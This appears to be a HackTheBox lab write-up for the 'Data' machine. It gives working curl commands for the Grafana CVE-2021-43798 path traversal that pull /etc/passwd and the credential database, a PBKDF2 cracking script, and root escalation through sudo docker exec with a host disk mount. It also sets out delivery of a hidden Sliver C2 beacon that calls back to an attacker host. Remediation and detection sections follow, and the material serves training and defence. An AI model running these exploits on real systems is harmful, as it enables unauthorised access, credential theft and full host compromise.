---
layout: default
title: "HackTheBox - Data"
---

# HackTheBox - Data

**OS:** Linux (Ubuntu 18.04.6 LTS host, Alpine 3.13.5 Docker container)

Data is an Easy Linux machine built around a Dockerized Grafana 8.0.0 instance. The attack
chain starts with CVE-2021-43798, an unauthenticated path-traversal in Grafana's plugin
endpoint, used to exfiltrate the Grafana SQLite database. The database contains a PBKDF2-SHA256
password hash for the user boris; cracking it reveals an SSH password reused on the host.
Privilege escalation exploits a passwordless `sudo` rule for `docker exec`: executing into the
container as root grants all Linux capabilities, the raw host block device is accessible from
within the container, and mounting it exposes the host's root filesystem.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` |
| Initial Access | CVE-2021-43798 Grafana path traversal, grafana.db hash extraction, PBKDF2-SHA256 crack, SSH |
| Privilege Escalation | `sudo docker exec` NOPASSWD, full root caps in container, host disk mount |
| Final Access | `root` (host) |

## Recon

### Port Scan

p0rtix's quick TCP sweep and version detection returned two ports.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 3000 | TCP | HTTP | Grafana 8.0.0 |

```
$ nmap -sV -sC -p 22,3000 <target-ip>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
```

### Web Fingerprint

The Grafana login page confirms version 8.0.0 via the `whatweb` response.

```
$ whatweb --no-errors -a 3 http://<target-ip>:3000
http://<target-ip>:3000/login [200 OK] Grafana[8.0.0], HTML5, IP[<target-ip>], Title[Grafana]
```

Directory busting against port 3000 surfaced the expected Grafana routes. User signup was
disabled (`/signup` confirmed via the settings JSON embedded in the page).

```
$ ffuf -u http://<target-ip>:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -fc 404,302 -t 20 -timeout 10 -ic -noninteractive
/api        [Status: 401, Size: 26]
/healthz    [Status: 200, Size: 2]
/login      [Status: 200, Size: 32882]
/signup     [Status: 200, Size: 32851]
```

## Initial Access

### CVE-2021-43798 -- Grafana Unauthenticated Path Traversal

Grafana 8.x (up to 8.3.0) exposes a path-traversal via the plugin static-file endpoint
`/public/plugins/<plugin-name>/../`. Any built-in plugin name works; the server does not
sanitise the `..` sequences before resolving the path, so arbitrary files readable by the
Grafana process can be fetched without authentication.

> **Why this works:** The Grafana HTTP handler for `/public/plugins/<id>/...` was intended to
> serve only files beneath the plugin directory. The file path was assembled by string
> concatenation before URL-decoding, meaning a raw `../` in the URL traversed upward in the
> filesystem. The fix (8.3.0) added a path-containment check after decoding.

Proof of traversal with `/etc/passwd`:

```
$ curl -s --path-as-is \
    "http://<target-ip>:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
...
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

The Alpine `/bin/ash` default shell and Alpine-specific user list confirm this is a Docker
container. The host's `etc/hostname` (`e6ff5b1cbc85`) and `/etc/hosts`
(`172.17.0.2 e6ff5b1cbc85`) confirm the container IP and ID prefix.

### Extracting the Grafana Database

Grafana's default SQLite database is at `/var/lib/grafana/grafana.db`. The traversal can
fetch binary files directly.

```
$ curl -s --path-as-is \
    "http://<target-ip>:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
    -o grafana.db
$ file grafana.db
grafana.db: SQLite 3.x database, last written using SQLite version 3035004
```

The `user` table holds credentials:

```
$ sqlite3 grafana.db "SELECT login, password, salt, email, is_admin FROM user;"
admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|admin@localhost|1
boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|boris@data.vl|0
```

### Hash Cracking

Grafana hashes passwords with `PBKDF2-HMAC-SHA256(password, salt, iterations=10000, dklen=50)`,
stored as hex. This is non-standard: the output key length is 50 bytes rather than the native
SHA-256 block size of 32 bytes. Standard hashcat mode 10900 (PBKDF2-SHA256) uses `dklen=32`
and will not produce a match; cracking requires a custom implementation.

Converting to a hashcat-compatible format for reference (hashcat with `--force` still mis-
matches due to the dklen):

```
$ python3 -c "
import base64, binascii
users = [
    ('admin', '7a919e4b...', 'YObSoLj55S'),
    ('boris',  'dc6beccc...', 'LCBhdtJWjl'),
]
for u, h, s in users:
    print(f'{u}:sha256:10000:{base64.b64encode(s.encode()).decode()}:{base64.b64encode(binascii.unhexlify(h)).decode()}')
"
```

A Python crack using `hashlib.pbkdf2_hmac` (OpenSSL-backed, C-accelerated) with rockyou
against the boris hash, parallelised across CPU cores:

```python
from hashlib import pbkdf2_hmac
import binascii, multiprocessing as mp

BORIS_HASH = 'dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8'
BORIS_SALT = 'LCBhdtJWjl'

def crack_chunk(chunk):
    for pw in chunk:
        pw = pw.strip()
        if not pw:
            continue
        derived = pbkdf2_hmac('sha256', pw.encode(), BORIS_SALT.encode(), 10000, 50)
        if binascii.hexlify(derived).decode() == BORIS_HASH:
            print(f'CRACKED! boris:{pw}')
            return

with open('/tmp/rockyou.txt', 'r', errors='ignore') as f:
    lines = f.readlines()

WORKERS = mp.cpu_count()
chunk_size = len(lines) // WORKERS
chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]

with mp.Pool(WORKERS) as pool:
    pool.map(crack_chunk, chunks)
```

```
Using 4 workers
CRACKED! boris:be*********
```

> **Why this works:** PBKDF2 with 10,000 iterations is designed to be slow; without GPU
> acceleration the crack rate on CPU is roughly 2,000-5,000 attempts per second per core.
> Rockyou with 4 cores finishes in under 20 minutes. The password landed inside the top
> ~800,000 entries. For a real target this dklen quirk would also block GPU crackers unless a
> custom kernel (e.g. a hashcat plugin) is written.

### SSH as Boris

The cracked Grafana password is reused on the host's SSH service:

```
$ ssh boris@<target-ip>
boris@<target-ip>'s password: be*********

Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)
...
boris@data:~$ whoami; id; cat ~/user.txt
boris
uid=1001(boris) gid=1001(boris) groups=1001(boris)
<user-flag-redacted>
```

## Privilege Escalation

### Sudo docker exec NOPASSWD

```
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Boris can run `docker exec` as root with any arguments. The Grafana container is the running
instance; its full 64-character ID is `e6ff5b1cbc85...` and is identified by the hostname
(`e6ff5b1cbc85`) read via the earlier LFI.

Verify exec works and note the effective capabilities when running as UID 0:

```
boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 id
uid=0(root) gid=0(root) groups=0(root)

boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 cat /proc/self/status | grep Cap
CapInh: 0000003fffffffff
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
```

> **Why this works:** `docker exec -u 0` spawns a new process inside the container's namespaces
> as UID 0. Because the container was not started with `--no-new-privileges` and no capability
> drop was specified in the image's seccomp/apparmor profile, all capabilities are available in
> the effective set (`CapEff: 0000003fffffffff` = all 38 Linux capabilities). Contrast this with
> PID 1 of the container (the Grafana process itself, `CapEff: 0`), which had no effective
> capabilities because it had already dropped them after startup.

### Block Device Access and Host Disk Mount

Checking available block devices from within the container:

```
boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 ls /dev/sda*
/dev/sda
/dev/sda1
/dev/sda2
```

The host block device `/dev/sda1` is accessible inside the container because Docker bind-mounts
`/etc/hostname`, `/etc/hosts`, and `/etc/resolv.conf` from the host disk. This exposes the raw
device to the container's device namespace. With `CAP_SYS_ADMIN` (present in `CapEff`), mounting
it is allowed:

```
boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 mkdir -p /mnt/host

boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 mount /dev/sda1 /mnt/host

boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 ls /mnt/host/
bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt
proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
```

The host's root filesystem is now at `/mnt/host` inside the container. Reading root's flag:

```
boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 cat /mnt/host/root/root.txt
<root-flag-redacted>
```

> **Why this works:** Docker containers share the host kernel but not the host's mount
> namespace. However, the host block device (`/dev/sda1`) was visible inside the container
> because Docker must expose the underlying device to support the bind-mount of `/etc/hostname`
> etc. from that partition. Normally containers do not have `CAP_SYS_ADMIN` and cannot call
> `mount(2)`, so the device being visible is harmless. Here, `docker exec -u 0` provided
> `CAP_SYS_ADMIN` (among all others) and the mount succeeds. The root flag is on the host
> filesystem, not inside the container, so reading it through the mount is reading the real
> host file.

> **Gotcha worth recording:** `/proc/self/environ` and `/proc/net/*` returned empty or 500
> errors from the Grafana LFI because the process's seccomp policy blocked those reads. The
> SQLite database (`/var/lib/grafana/grafana.db`) was readable because Grafana needs write
> access to its own data directory.

## Post-Exploitation: C2 (Sliver)

Once SSH access was established as boris, a Sliver HTTPS beacon was delivered to demonstrate
C2. The implant pool (`pool-https-linux64` profile, targeting `<attacker-ip>:443`) was
regenerated as `pool-https-linuxamd64` and uploaded over SCP.

**Beacon delivery (Linux detachment pattern):**

```
# On the attack box: upload the beacon
$ scp /path/to/sliver-payloads/pool-https-linuxamd64 boris@<target-ip>:/tmp/.beacon

# On the target: detach from the SSH session's process group
boris@data:~$ chmod +x /tmp/.beacon
boris@data:~$ nohup setsid /tmp/.beacon </dev/null >/dev/null 2>&1 &
[1] 10775
```

> **Why setsid + nohup:** A bare `&` still keeps the process in the SSH session's process
> group, so it receives SIGHUP when the session closes and the beacon dies. `setsid` creates a
> new session (breaks the SIGHUP propagation chain); `nohup` adds redundant protection and
> redirecting stdin/stdout to `/dev/null` prevents any tty interaction from killing the process.

**Sliver team-server output (callback):**

```
sliver > beacons

 ID         Name                    Transport   Hostname   Username   Last Check-In
========== ======================= =========== ========== ========== ===================
 5259262a   pool-https-linuxamd64   http(s)     data       boris      2026-06-27 01:23:01
```

**C2 commands issued via the beacon (next check-in):**

```
sliver (pool-https-linuxamd64) > execute id
uid=1001(boris) gid=1001(boris) groups=1001(boris)

sliver (pool-https-linuxamd64) > execute hostname -I
10.129.26.12 172.17.0.1 dead:beef::a0de:adff:fe76:bbc1
```

The beacon confirmed C2 over HTTPS to port 443. The listener and beacon were torn down after
demonstration; the beacon binary was removed from `/tmp/.beacon`.

## Root Cause

Two independently bad configurations combined to produce a full compromise:

1. **Unpatched Grafana 8.0.0**: CVE-2021-43798 was disclosed November 2021 and patched in
   8.3.0. Leaving an older version internet-accessible with no compensating controls (no
   auth-proxy, no WAF) allowed unauthenticated file read of any file the Grafana process
   could access, including its own credentials database.

2. **Unrestricted `sudo docker exec`**: The `*` wildcard grants boris the ability to exec any
   command in any container as any UID. Because the container image grants root full
   capabilities (no drop, no `--no-new-privileges`), and because the host block device was
   exposed to the container's device namespace, this NOPASSWD rule became a one-step root
   escalation.

## Impact

- Full read access to any file reachable by the Grafana process (unauthenticated), including
  the credentials database.
- SSH foothold on the host via cracked credential reuse.
- Complete compromise of the host root filesystem via Docker container escape.

## Remediation

Priority-ordered (first items break the attack path; later items harden):

1. **Patch Grafana to 8.3.0+ (or current).** CVE-2021-43798 is a critical, unauthenticated
   read vulnerability. Upgrade immediately or place Grafana behind an auth proxy.
2. **Restrict `sudo docker exec`.** Remove the NOPASSWD rule or scope it to specific container
   IDs and commands (not `*`). If Docker management is needed, gate it with a group membership
   check or a purpose-built wrapper that audits usage.
3. **Drop container capabilities at runtime.** Add `--cap-drop=ALL --cap-add=...` (minimum
   required caps) to the `docker run` invocation. For Grafana, no elevated capabilities are
   needed. This would prevent `mount(2)` even if the block device were visible.
4. **Use `--no-new-privileges`.** Adding this flag to the Docker run command prevents `exec`
   sessions from inheriting a wider capability set than the process that started the container.
5. **Use unique, strong passwords.** Boris's Grafana password was in the rockyou wordlist. A
   random password manager-generated credential removes the offline-crack vector.
6. **Do not reuse credentials across services.** The SSH foothold relied entirely on the Grafana
   password being identical to the SSH password. Credential isolation limits blast radius.

### Validation

| Fix | How to confirm |
|---|---|
| Grafana patched | `curl http://<target-ip>:3000/public/plugins/alertlist/../../etc/passwd` returns 404/403 |
| `sudo docker exec` removed | `sudo -l` as boris shows no docker rule |
| Capabilities dropped | `docker inspect <container> \| grep CapDrop` shows ALL; exec as root gets `CapEff: 0` |
| `--no-new-privileges` | `docker inspect <container> \| grep NoNewPrivileges` returns `true` |

## Detection Opportunities

| Signal | Event / Source |
|---|---|
| CVE-2021-43798 exploitation | Grafana access log: repeated `GET /public/plugins/<name>/../` with 200 response and unexpected file content |
| Grafana DB exfiltration | Large response body for a `/public/plugins/` request; file reads of `/var/lib/grafana/grafana.db` |
| Password crack attempts | No host-side signal; monitor for excessive failed Grafana logins before a successful one |
| `sudo docker exec` invocation | `/var/log/auth.log`: `sudo: boris : TTY=pts/0 ; COMMAND=/snap/bin/docker exec ...` |
| Block device mount inside container | Host audit log: `mount` syscall with source `/dev/sda1` from a container-namespaced PID |
| Root filesystem read via container | Audit rules on `/proc/<container_pid>/root/root/` path traversal |
| Sliver HTTPS beacon | NDR: periodic HTTPS GET to `<attacker-ip>:443` with unusual URI patterns; no valid cert chain |

## Lessons Learned

- CVE-2021-43798 requires no authentication and no interaction from the target, making it
  extremely fast to exploit. Any Grafana 8.x instance on a network perimeter is a
  high-priority patching target.
- PBKDF2-SHA256 with a non-standard `dklen=50` breaks off-the-shelf GPU cracking tools.
  Recognising this saved time: skipping hashcat and going straight to a CPU-parallel Python
  script with OpenSSL-backed `hashlib.pbkdf2_hmac` was the correct approach.
- `sudo docker exec *` is functionally equivalent to `sudo su` when the target container
  runs without capability drops and the host disk is visible. Any Docker management sudo rule
  deserves the same scrutiny as a direct root grant.
- The host block device exposure is a Docker implementation detail (supporting `/etc/hostname`
  bind-mounts) that most operators and defenders are unaware of. Documenting it explicitly
  for the writeup is important.

## Cleanup

```
# Beacon torn down (kill_beacon via Sliver MCP)
# Beacon binary removed from target
boris@data:~$ rm -f /tmp/.beacon

# Host disk unmounted from inside container
boris@data:~$ sudo /snap/bin/docker exec -u 0 e6ff5b1cbc85 umount /mnt/host

# No AD objects, ACLs, or host files were modified
# grafana.db and passwd retrieved during recon; no secrets committed to public repo
```

No persistent changes were made to the target. The only artifacts were `/tmp/.beacon`
(removed) and the in-memory Sliver process (killed). The container's `/mnt/host` directory
remains (harmless empty directory in the container's upper overlay layer).
